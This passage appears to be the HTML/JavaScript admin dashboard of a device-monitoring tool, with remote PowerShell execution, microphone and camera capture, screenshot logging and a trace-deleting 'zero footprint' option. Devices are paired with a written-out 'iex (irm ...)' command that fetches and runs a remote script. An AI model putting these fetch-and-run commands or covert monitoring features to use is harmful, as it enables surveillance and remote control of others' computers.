            <div style="margin-bottom:1.25rem; padding:0.75rem; background:rgba(255,255,255,0.03); border-radius:6px; font-size:0.8rem; color:var(--text-muted); line-height:1.5;">
                <b style="color:var(--text-main);">Option 2: Interactive Prompt:</b> Run <code>iex (irm 'https://.../setup_client.ps1')</code> and type the 6-digit code when prompted on the client screen.
            </div>

            <div id="otp-status-banner" style="display:flex; align-items:center; gap:0.6rem; padding:0.65rem 0.9rem; border-radius:6px; background:#1e293b; border:1px solid #334155; font-size:0.82rem;">
                <span class="live-dot" style="background:#38bdf8; width:8px; height:8px;"></span>
                <span id="otp-status-text" style="color:var(--text-main);">Waiting for client to connect and enter OTP...</span>
            </div>

            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:1.25rem; border-top:1px solid var(--border); padding-top:1rem;">
                <button onclick="generateNewOtp()" style="background:none; border:1px solid var(--border); color:var(--text-muted); padding:0.45rem 0.9rem; border-radius:6px; font-size:0.8rem; cursor:pointer;">Generate New OTP</button>
                <button onclick="closeOtpModal()" style="background:var(--bg-main); border:1px solid var(--border); color:var(--text-main); padding:0.45rem 1.25rem; border-radius:6px; font-size:0.85rem; font-weight:600; cursor:pointer;">Close</button>
            </div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div id="terminal-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2100; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
        <div style="background:#0d1117; border:1px solid #30363d; border-radius:12px; width:720px; max-width:95%; padding:1.25rem; box-shadow:0 8px 32px rgba(0,0,0,0.7); display:flex; flex-direction:column; gap:0.75rem;">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <div style="display:flex; align-items:center; gap:0.6rem;">
                    <svg style="width:18px;height:18px;color:#58a6ff;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                    <span style="font-size:1rem; font-weight:600; color:#e6edf3;">Remote PowerShell</span>
                    <span id="terminal-device-label" style="font-size:0.8rem; color:#8b949e; background:#21262d; padding:2px 8px; border-radius:4px;"></span>
                </div>
                <button onclick="closeTerminalModal()" style="background:none; border:none; color:#8b949e; cursor:pointer; font-size:1.25rem;">&times;</button>
            </div>
            <div id="terminal-output" style="font-family:'Cascadia Code','Consolas',monospace; font-size:0.82rem; background:#010409; border:1px solid #21262d; border-radius:6px; padding:0.75rem 1rem; min-height:280px; max-height:380px; overflow-y:auto; color:#e6edf3; white-space:pre-wrap; line-height:1.6;">
                <span style="color:#8b949e;">&#x25BA; Remote PowerShell terminal ready. Commands run on the target device.\n&#x26A1; Real-time execution: client polling active every 2s for fast responses.\n</span>
            </div>
            <div style="display:flex; gap:0.5rem; align-items:center; background:#010409; border:1px solid #21262d; border-radius:6px; padding:0.5rem 0.75rem;">
                <span style="color:#3fb950; font-family:monospace; font-size:0.9rem; white-space:nowrap;">PS &gt;</span>
                <input type="text" id="terminal-input" placeholder="Enter PowerShell command..." onkeydown="if(event.key==='Enter') sendTerminalCommand()"
                    style="flex:1; background:none; border:none; outline:none; color:#e6edf3; font-family:'Cascadia Code','Consolas',monospace; font-size:0.85rem;">
                <button onclick="sendTerminalCommand()" id="terminal-send-btn"
                    style="background:#238636; border:none; color:#fff; padding:0.3rem 0.9rem; border-radius:5px; font-size:0.8rem; font-weight:600; cursor:pointer; white-space:nowrap;">Run</button>
            </div>
            <div style="font-size:0.75rem; color:#6e7681; display:flex; gap:1rem; flex-wrap:wrap;">
                <span>&#128161; <b style="color:#8b949e;">Quick:</b></span>
                <span onclick="setTerminalCmd('Get-Process | Sort-Object CPU -Desc | Select-Object -First 15 | Format-Table Name,CPU,WorkingSet -Auto')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Top Processes</span>
                <span onclick="setTerminalCmd('Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID,@{n=\'Free(GB)\';e={[math]::Round($_.FreeSpace/1GB,1)}},@{n=\'Size(GB)\';e={[math]::Round($_.Size/1GB,1)}} | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Disk Space</span>
                <span onclick="setTerminalCmd('Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,AddressFamily | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Network IPs</span>
                <span onclick="setTerminalCmd('Get-EventLog -LogName System -Newest 20 -EntryType Error | Format-Table TimeGenerated,Source,Message -Wrap')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">System Errors</span>
                <span onclick="setTerminalCmd('systeminfo | Select-String \"OS Name|System Boot|Total Physical\"')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">System Info</span>
                <span onclick="setTerminalCmd('Get-ScheduledTask | Where-Object {$_.State -eq \"Running\"} | Select-Object TaskName,TaskPath | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Running Tasks</span>
            </div>
        </div>
    </div>

    <!-- AV Diagnostics & Media Modal -->
    <div id="av-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2100; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
        <div style="background:#0d1117; border:1px solid #30363d; border-radius:12px; width:640px; max-width:95%; padding:1.5rem; box-shadow:0 8px 32px rgba(0,0,0,0.7); display:flex; flex-direction:column; gap:1rem;">
            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #21262d; padding-bottom:0.75rem;">
                <div style="display:flex; align-items:center; gap:0.6rem;">
                    <svg style="width:20px;height:20px;color:#10b981;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                    <span style="font-size:1.1rem; font-weight:700; color:#e6edf3;">AV Diagnostics & Media Session</span>
                    <span id="av-device-label" style="font-size:0.8rem; color:#8b949e; background:#21262d; padding:2px 8px; border-radius:4px;"></span>
                </div>
                <button onclick="closeAvModal()" style="background:none; border:none; color:#8b949e; cursor:pointer; font-size:1.4rem;">&times;</button>
            </div>

            <div style="background:rgba(16, 185, 129, 0.08); border:1px solid rgba(16, 185, 129, 0.25); border-radius:8px; padding:0.75rem; font-size:0.8rem; color:#a7f3d0; line-height:1.5;">
                <div style="font-weight:600; margin-bottom:0.25rem; display:flex; align-items:center; gap:0.4rem;">
                    <span>🛡️</span> Hardware Privacy & Windows Security Compliance
                </div>
                <div>All diagnostic sessions strictly respect hardware LED indicators, Windows taskbar microphone notifications, and device permissions. Payloads are encrypted end-to-end with <b>AES-256-GCM</b>.</div>
            </div>

            <div style="display:flex; gap:0.75rem; flex-wrap:wrap;">
                <button onclick="startAvDiagnostic('audio')" id="btn-diag-audio" style="flex:1; background:#1e293b; border:1px solid #38bdf8; color:#38bdf8; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
                    <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
                    Microphone Diagnostic (5s)
                </button>
                <button onclick="startAvDiagnostic('camera')" id="btn-diag-camera" style="flex:1; background:#1e293b; border:1px solid #10b981; color:#10b981; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
                    <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                    Camera Frame Diagnostic
                </button>
            </div>

            <div id="av-status-box" style="background:#010409; border:1px solid #21262d; border-radius:8px; padding:1rem; min-height:160px; display:flex; flex-direction:column; gap:0.75rem; color:#e6edf3; font-size:0.85rem;">
                <div id="av-status-text" style="color:#8b949e;">Select a diagnostic test above to initiate an authorized session.</div>
                <audio id="av-audio-player" controls style="display:none; width:100%; margin-top:0.5rem;"></audio>
                <div style="text-align:center;">
                    <img id="av-camera-img" style="display:none; max-width:100%; max-height:280px; border-radius:8px; border:1px solid #30363d; margin:0 auto;" />
                </div>
            </div>
        </div>
    </div>

    <!-- Settings Modal -->
    <div id="settings-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:2000; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
        <div class="modal-content" style="background:var(--bg-card); border:1px solid var(--border); border-radius:12px; width:450px; max-width:90%; padding:1.5rem; box-shadow:0 8px 32px rgba(0,0,0,0.5);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.25rem; border-bottom:1px solid var(--border); padding-bottom:0.75rem;">
                <h3 style="margin:0; font-size:1.15rem; color:var(--text-main);">Device Settings</h3>
                <div style="display:flex; gap:0.5rem; align-items:center;">
                    <button onclick="openTerminalModal()" title="Remote PowerShell Terminal" style="background:#1f2937; border:1px solid #374151; color:#58a6ff; padding:0.35rem 0.75rem; border-radius:6px; font-size:0.8rem; font-weight:600; cursor:pointer; display:flex; align-items:center; gap:0.4rem;">
                        <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                        Terminal
                    </button>
                    <button onclick="closeSettingsModal()" style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1.25rem;">&times;</button>
                </div>
            </div>
            
            <div style="margin-bottom: 1.25rem; padding: 0.75rem; border-radius: 8px; background-color: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); font-size: 0.85rem; font-weight: 500; display: flex; align-items: center; gap: 0.5rem;" id="settings-sync-status">
                <span style="height: 8px; width: 8px; border-radius: 50%; display: inline-block; background-color: var(--live);" id="sync-status-dot"></span>
                <span id="sync-status-text" style="color: var(--text-main);">Checking sync status...</span>
            </div>
            
            <div style="display:flex; flex-direction:column; gap:1.25rem; max-height: 55vh; overflow-y: auto; padding-right: 0.25rem; margin-bottom: 1rem;">
                <div>
                    <label style="display:block; font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem; font-weight:500;">Device ID</label>
                    <input type="text" id="settings-device-id" disabled style="width:100%; background:var(--bg-main); border:1px solid var(--border); padding:0.5rem; border-radius:6px; color:var(--text-muted); font-size:0.9rem;">
                </div>
                
                <div>
                    <label style="display:block; font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem; font-weight:500;">Nickname</label>
                    <input type="text" id="settings-nickname" style="width:100%; background:var(--bg-main); border:1px solid var(--border); padding:0.5rem; border-radius:6px; color:var(--text-main); font-size:0.9rem;">
                </div>
                
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem;">
                    <div>
                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Pause Monitoring</div>
                        <div style="font-size:0.75rem; color:var(--text-muted);">Temporarily stop all logging and screenshots on this device</div>
                    </div>
                    <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
                        <input type="checkbox" id="settings-is-disabled" style="opacity:0; width:0; height:0;">
                        <span class="slider round" style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#374151; transition:.3s; border-radius:34px;"></span>
                    </label>
                </div>
                
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem;">
                    <div>
                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Disable Mouse Click Screenshots</div>
                        <div style="font-size:0.75rem; color:var(--text-muted);">Disable rate-limited screenshot captures on mouse clicks</div>
                    </div>
                    <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
                        <input type="checkbox" id="settings-disable-mouse" style="opacity:0; width:0; height:0;">
                        <span class="slider round" style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#374151; transition:.3s; border-radius:34px;"></span>
                    </label>
                </div>
                
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem;">
                    <div>
                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Zero Local Footprint</div>
                        <div style="font-size:0.75rem; color:var(--text-muted);">Delete screenshots and skip backup text logs locally</div>
                    </div>
                    <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
                        <input type="checkbox" id="settings-zero-footprint" style="opacity:0; width:0; height:0;">
                        <span class="slider round" style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#374151; transition:.3s; border-radius:34px;"></span>
                    </label>
                </div>
                
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem;">
                    <div>
                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Periodic Screenshots</div>
                        <div style="font-size:0.75rem; color:var(--text-muted);">Interval between automated screen grabs</div>
                    </div>
                    <select id="settings-periodic-interval" class="date-select" style="width:130px;">
                        <option value="0">Disabled</option>
                        <option value="60">1 Minute</option>
                        <option value="180">3 Minutes</option>
                        <option value="300">5 Minutes</option>
                        <option value="600">10 Minutes</option>
                    </select>
                </div>
                
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem;">
                    <div>
                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Optimize Screenshots (On App Switch)</div>
                        <div style="font-size:0.75rem; color:var(--text-muted);">Only capture screenshots when switching focus away from the active application (saves storage)</div>
                    </div>
                    <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
                        <input type="checkbox" id="settings-only-switch" style="opacity:0; width:0; height:0;">
                        <span class="slider round" style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#374151; transition:.3s; border-radius:34px;"></span>
                    </label>
                </div>
                
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem; margin-bottom:1rem;">
                    <div>
                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Idle Activity Timeout</div>
                        <div style="font-size:0.75rem; color:var(--text-muted);">Time threshold to stop screenshots when user is inactive</div>
                    </div>
                    <select id="settings-idle-threshold" class="date-select" style="width:130px;">
                        <option value="60">1 Minute</option>
                        <option value="120">2 Minutes</option>
                        <option value="300">5 Minutes</option>
                        <option value="600">10 Minutes</option>
                    </select>
                </div>
            </div>
            
            <div style="display:flex; justify-content:flex-end; gap:0.75rem; border-top:1px solid var(--border); padding-top:1rem; margin-top:1rem;">
                <button onclick="closeSettingsModal()" style="background:var(--bg-main); border:1px solid var(--border); color:var(--text-muted); padding:0.5rem 1rem; border-radius:6px; font-size:0.85rem; font-weight:600; cursor:pointer;">Cancel</button>
                <button onclick="saveSettings()" style="background:var(--accent); border:none; color:#ffffff; padding:0.5rem 1rem; border-radius:6px; font-size:0.85rem; font-weight:600; cursor:pointer;">Save Changes</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentTab = localStorage.getItem('currentTab') || 'logs-tab';
        let startDate = localStorage.getItem('startDate') || new Date().toISOString().split('T')[0];
        let endDate = localStorage.getItem('endDate') || new Date().toISOString().split('T')[0];
        let selectedSort = localStorage.getItem('selectedSort') || 'asc';
        let selectedDevice = localStorage.getItem('selectedDevice') || '';
        let allDevices = [];
        let allLogs = [];
        let allScreenshots = [];
        
        // Track selected items across updates
        let selectedLogKeys = new Set(); // format: "timestamp||text"
        let selectedScreenshotFilenames = new Set();
        
        let currentModalFilename = '';
        
        function switchTab(tabId, btn) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            
            document.getElementById(tabId).classList.add('active');
            btn.classList.add('active');
            currentTab = tabId;
            localStorage.setItem('currentTab', tabId);
        }
        
        let currentModalSrc = '';
        
        function navigateModal(direction) {
            const allElements = Array.from(document.querySelectorAll('[onclick*="openImage"]'));
            if (allElements.length === 0) return;
            
            // Map to absolute URLs for clean comparison
            const srcs = allElements.map(el => {
                const tempLink = document.createElement('a');
                const parts = (el.getAttribute('onclick') || '').split("'");
                tempLink.href = parts.length >= 2 ? parts[1] : '';
                return tempLink.href;
            });
            
            // Resolve current modal src as absolute
            const tempLink = document.createElement('a');
            tempLink.href = currentModalSrc;
            const currentAbsSrc = tempLink.href;
            
            let index = srcs.indexOf(currentAbsSrc);
            if (index === -1) {
                // Fallback: match by filename substring
                const currentFilename = currentAbsSrc.split('/').pop();
                index = srcs.findIndex(s => s.split('/').pop() === currentFilename);
            }
            
            if (index !== -1) {
                let nextIndex = index + direction;
                if (nextIndex >= srcs.length) nextIndex = 0;
                if (nextIndex < 0) nextIndex = srcs.length - 1;
                
                const nextImg = allElements[nextIndex];
                const clickAttr = nextImg.getAttribute('onclick') || '';
                const parts = clickAttr.split("'");
                if (parts.length >= 2) {
                    openImage(parts[1], parts.length >= 4 ? parts[3] : undefined);
                }
            }
        }
        
        window.addEventListener('keydown', function(event) {
            const modal = document.getElementById('imgModal');
            if (modal && modal.style.display === 'flex') {
                if (event.key === 'ArrowRight') {
                    navigateModal(1);
                } else if (event.key === 'ArrowLeft') {
                    navigateModal(-1);
                } else if (event.key === 'Escape') {
                    closeModal();
                }
            }
        });
        
        function openImage(src, filename) {
            currentModalSrc = src;
            const modal = document.getElementById('imgModal');
            const img = document.getElementById('modalImg');
            const deleteBtn = document.getElementById('modal-delete-btn');
            
            modal.style.display = 'flex';
            img.src = src;
            
            if (filename) {
                currentModalFilename = filename;
                deleteBtn.style.display = 'block';
            } else {
                let extracted = src;
                if (src.startsWith('/screenshots/')) {
                    extracted = src.substring('/screenshots/'.length);
                } else if (src.startsWith('screenshots/')) {
                    extracted = src.substring('screenshots/'.length);
                }
                currentModalFilename = extracted;
                deleteBtn.style.display = 'block';
            }
        }
        
        function closeModal() {
            document.getElementById('imgModal').style.display = 'none';
        }
        
        async function deleteModalScreenshot() {
            if (!currentModalFilename) return;
            if (!confirm("Are you sure you want to delete this screenshot?")) {
                return;
            }
            try {
                const res = await fetch(`/api/screenshots/${currentModalFilename}`, {
                    method: 'DELETE'
                });
                if (res.ok) {
                    closeModal();
                    selectedScreenshotFilenames.delete(currentModalFilename);
                    fetchScreenshots();
                    fetchLogs();
                } else {
                    alert("Failed to delete screenshot");
                }
            } catch (err) {
                console.error("Error deleting screenshot:", err);
            }
        }
        
        function changeSort(sortOrder) {
            selectedSort = sortOrder;
            localStorage.setItem('selectedSort', sortOrder);
            fetchLogs();
            fetchScreenshots();
        }
        
        function updateMonitoringButton() {
            const dev = allDevices.find(d => d.device_id === selectedDevice);
        }
        
        async function updateDeviceStatus() {
            if (!selectedDevice) return;
            try {
                const res = await fetch(`/api/devices/config?device_id=${encodeURIComponent(selectedDevice)}`);
                if (res.ok) {
                    const config = await res.json();
                    if (config && config._last_active && allDevices) {
                        const devObj = allDevices.find(dev => dev.device_id === selectedDevice);
                        if (devObj) devObj.last_active = config._last_active;
                    }
                    const d = allDevices.find(dev => dev.device_id === selectedDevice);
                    const activeIso = (config && config._last_active) || (d ? d.last_active : null);
                    const lastActiveDate = activeIso ? new Date(activeIso) : new Date(0);
                    const isOnline = activeIso ? (new Date() - lastActiveDate) < 120000 : false;
                    
                    const dot = document.getElementById('detail-live-dot');
                    const txt = document.getElementById('detail-live-status-text');
                    
                    if (config.is_disabled) {
                        dot.style.backgroundColor = '#f59e0b'; // Amber/Orange
                        txt.innerText = 'MONITORING PAUSED';
                    } else if (isOnline) {
                        dot.style.backgroundColor = 'var(--live)';
                        txt.innerText = 'ONLINE CONNECTED';
                    } else {
                        dot.style.backgroundColor = 'var(--text-muted)';
                        txt.innerText = 'OFFLINE DISCONNECTED';
                    }
                }
            } catch (err) {
                console.error("Error updating device status UI:", err);
            }
        }

        async function openSettingsModal() {
            if (!selectedDevice) return;
            
            document.getElementById('settings-device-id').value = selectedDevice;
            const d = allDevices.find(dev => dev.device_id === selectedDevice);
            document.getElementById('settings-nickname').value = d ? (d.nickname || '') : '';
            
            // Set defaults initially
            document.getElementById('settings-is-disabled').checked = false;
            document.getElementById('settings-disable-mouse').checked = false;
            document.getElementById('settings-zero-footprint').checked = false;
            document.getElementById('settings-periodic-interval').value = "300";
            document.getElementById('settings-idle-threshold').value = "300";
            document.getElementById('settings-only-switch').checked = false;
            
            const dot = document.getElementById('sync-status-dot');
            const txt = document.getElementById('sync-status-text');
            dot.style.backgroundColor = '#94a3b8';
            txt.innerText = 'Checking sync status...';
            
            // Fetch configuration from server
            try {
                const res = await fetch(`/api/devices/config?device_id=${encodeURIComponent(selectedDevice)}`);
                if (res.ok) {
                    const config = await res.json();
                    document.getElementById('settings-is-disabled').checked = config.is_disabled || false;
                    document.getElementById('settings-disable-mouse').checked = config.disable_mouse_clicks || false;
                    document.getElementById('settings-zero-footprint').checked = config.zero_footprint || false;
                    document.getElementById('settings-periodic-interval').value = String(config.periodic_screenshot_interval !== undefined ? config.periodic_screenshot_interval : 300);
                    document.getElementById('settings-idle-threshold').value = String(config.idle_threshold !== undefined ? config.idle_threshold : 300);
                    document.getElementById('settings-only-switch').checked = config.only_capture_on_switch || false;
                }
            } catch (err) {
                console.error("Error fetching device config:", err);
            }
            
            // Fetch sync status
            try {
                const res = await fetch(`/api/devices/sync-status?device_id=${encodeURIComponent(selectedDevice)}`);
                if (res.ok) {
                    const data = await res.json();
                    if (data.is_synced) {
                        dot.style.backgroundColor = 'var(--live)';
                        txt.innerText = data.synced_at 
                            ? `Synced with laptop (Last synced: ${new Date(data.synced_at).toLocaleTimeString()})`
                            : 'Synced with laptop';
                    } else {
                        dot.style.backgroundColor = '#f59e0b';
                        txt.innerText = 'Pending sync (Waiting for laptop to poll...)';
                    }
                }
            } catch (err) {
                console.error("Error fetching sync status:", err);
            }
            
            const modal = document.getElementById('settings-modal');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.style.opacity = '1';
                modal.style.pointerEvents = 'auto';
            }, 50);
        }
        
        function closeSettingsModal() {
            const modal = document.getElementById('settings-modal');
            modal.style.opacity = '0';
            modal.style.pointerEvents = 'none';
            setTimeout(() => {
                modal.style.display = 'none';
            }, 200);
        }

        // ==================== OTP DEVICE SETUP MODAL ====================
        let currentOtp = '';
        let otpCountdown = 600;
        let otpTimerInterval = null;
        let otpPollInterval = null;

        async function openOtpModal() {
            const modal = document.getElementById('otp-modal');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.style.opacity = '1';
                modal.style.pointerEvents = 'auto';
            }, 50);
            await generateNewOtp();
        }

        function closeOtpModal() {
            const modal = document.getElementById('otp-modal');
            modal.style.opacity = '0';
            modal.style.pointerEvents = 'none';
            if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
            if (otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
            setTimeout(() => { modal.style.display = 'none'; }, 200);
        }

        async function generateNewOtp() {
            if (otpTimerInterval) clearInterval(otpTimerInterval);
            if (otpPollInterval) clearInterval(otpPollInterval);

            document.getElementById('otp-display').innerText = '......';
            document.getElementById('otp-timer').innerText = '01:00';
            document.getElementById('otp-timer').style.color = '#38bdf8';
            document.getElementById('otp-status-text').innerText = 'Generating secure OTP...';
            document.getElementById('otp-copy-btn').innerText = 'Copy';
            document.getElementById('otp-status-banner').style.background = '#1e293b';
            document.getElementById('otp-status-banner').style.border = '1px solid #334155';

            try {
                const res = await fetch('/api/otp/generate', { method: 'POST' });
                const data = await res.json();
                if (data.status === 'success') {
                    currentOtp = data.otp;
                    document.getElementById('otp-display').innerText = currentOtp;
                    
                    const origin = window.location.origin;
                    const cmd = `iex (irm '${origin}/api/client/update/setup_client.ps1?otp=${currentOtp}')`;
                    document.getElementById('otp-cmd-input').value = cmd;
                    document.getElementById('otp-status-text').innerText = 'Waiting for client to connect and enter OTP...';

                    otpCountdown = data.expires_in || 60;
                    otpTimerInterval = setInterval(updateOtpCountdown, 1000);
                    otpPollInterval = setInterval(pollOtpStatus, 3000);
                } else {
                    document.getElementById('otp-status-text').innerText = 'Error generating OTP: ' + (data.error || 'Failed');
                }
            } catch (err) {
                document.getElementById('otp-status-text').innerText = 'Error: ' + err.message;
            }
        }

        function updateOtpCountdown() {
            otpCountdown--;
            if (otpCountdown <= 0) {
                clearInterval(otpTimerInterval); otpTimerInterval = null;
                clearInterval(otpPollInterval); otpPollInterval = null;
                document.getElementById('otp-timer').innerText = 'EXPIRED';
                document.getElementById('otp-timer').style.color = '#ef4444';
                document.getElementById('otp-status-text').innerText = 'OTP has expired. Click "Generate New OTP".';
                return;
            }
            const mins = Math.floor(otpCountdown / 60);
            const secs = otpCountdown % 60;
            document.getElementById('otp-timer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
        }

        async function pollOtpStatus() {
            if (!currentOtp) return;
            try {
                const res = await fetch(`/api/otp/status?otp=${currentOtp}`);
                const data = await res.json();
                if (data.status === 'consumed') {
                    clearInterval(otpPollInterval); otpPollInterval = null;
                    clearInterval(otpTimerInterval); otpTimerInterval = null;
                    document.getElementById('otp-status-banner').style.background = 'rgba(16, 185, 129, 0.15)';
                    document.getElementById('otp-status-banner').style.border = '1px solid #10b981';
                    document.getElementById('otp-status-text').innerHTML = '<b style="color:#10b981;">✓ Device successfully paired and authenticated!</b>';
                    fetchDevices();
                }
            } catch (e) {}
        }

        function copyOtpCommand() {
            const input = document.getElementById('otp-cmd-input');
            input.select();
            navigator.clipboard.writeText(input.value);
            const btn = document.getElementById('otp-copy-btn');
            btn.innerText = 'Copied!';
            setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
        }

        // ==================== LIVE AUTO-REFRESHING BANNER OTP ====================
        let bannerOtp = '';
        let bannerOtpExpiresAt = 0;
        let bannerOtpTimer = null;
        let bannerOtpPoll = null;
        let isRefreshingOtp = false;
        let otpRetryTimeout = null;

        function formatCountdown(totalSecs) {
            const m = Math.floor(totalSecs / 60);
            const s = totalSecs % 60;
            return `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
        }

        function setCopyBtnState(enabled, label) {
            const btn = document.getElementById('banner-copy-btn');
            if (!btn) return;
            const svgIcon = '<svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>';
            btn.innerHTML = `${svgIcon} ${label}`;
            if (enabled) {
                btn.disabled = false;
                btn.style.opacity = '1';
                btn.style.cursor = 'pointer';
                btn.style.background = 'var(--accent)';
            } else {
                btn.disabled = true;
                btn.style.opacity = '0.5';
                btn.style.cursor = 'not-allowed';
                btn.style.background = 'var(--accent)';
            }
        }

        async function initBannerOtp() {
            await refreshBannerOtp();
        }

        async function refreshBannerOtp() {
            if (isRefreshingOtp) return;
            isRefreshingOtp = true;

            if (bannerOtpTimer) { clearInterval(bannerOtpTimer); bannerOtpTimer = null; }
            if (bannerOtpPoll) { clearInterval(bannerOtpPoll); bannerOtpPoll = null; }
            if (otpRetryTimeout) { clearTimeout(otpRetryTimeout); otpRetryTimeout = null; }

            const display = document.getElementById('banner-otp-display');
            const timerEl = document.getElementById('banner-otp-timer');
            const cmdInput = document.getElementById('banner-otp-cmd');
            const statusEl = document.getElementById('banner-status-text');

            // Invalidate current OTP state immediately to prevent copying stale code
            bannerOtp = '';
            bannerOtpExpiresAt = 0;
            if (display) display.innerText = '······';
            if (timerEl) { timerEl.innerText = '01:00'; timerEl.style.color = '#38bdf8'; }
            if (cmdInput) cmdInput.value = 'Generating command...';
            setCopyBtnState(false, 'Generating...');

            try {
                const res = await fetch('/api/otp/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                const data = await res.json();
                if (data.status === 'success' && data.otp) {
                    bannerOtp = data.otp;
                    const duration = Number(data.expires_in) || 60;
                    bannerOtpExpiresAt = Date.now() + (duration * 1000);

                    if (display) display.innerText = bannerOtp;
                    const origin = window.location.origin;
                    const cmd = `iex (irm '${origin}/api/client/update/setup_client.ps1?otp=${bannerOtp}')`;
                    if (cmdInput) cmdInput.value = cmd;
                    if (statusEl) statusEl.innerHTML = '<span>💡 Run this in PowerShell on any Windows machine to install and pair it automatically.</span>';

